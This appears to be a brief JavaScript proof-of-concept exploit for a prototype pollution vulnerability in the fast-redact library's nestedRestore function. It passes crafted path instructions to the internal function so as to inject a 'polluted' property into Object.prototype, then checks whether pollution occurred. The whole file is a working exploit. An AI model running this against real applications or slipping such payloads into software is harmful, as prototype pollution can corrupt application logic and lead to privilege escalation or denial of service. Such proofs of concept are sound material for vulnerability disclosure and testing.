// Create a custom object
const customObject = {};

// Craft the instructions to inject a property into Object.prototype
const instructions = [
  {
    target: customObject,
    path: ["polluted", "prototype", "constructor"],
    value: true
  }
];

// Call the vulnerable function with the crafted instructions
require("fast-redact/lib/modifiers").nestedRestore(instructions);

// Verify the exploit
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]':'');